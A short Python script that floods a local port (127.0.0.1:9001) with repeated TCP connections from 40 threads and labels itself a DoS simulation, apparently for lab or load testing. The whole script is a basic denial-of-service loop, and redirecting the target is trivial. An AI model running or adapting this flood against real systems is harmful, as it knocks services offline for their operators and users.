import socket, threading

TARGET = ("127.0.0.1", 9001)

def flood():
    while True:
        try:
            s = socket.socket()
            s.connect(TARGET)
            s.close()
        except:
            pass

for _ in range(40):
    threading.Thread(target=flood, daemon=True).start()

print("DoS simulation running. Press ENTER to stop.")
input()
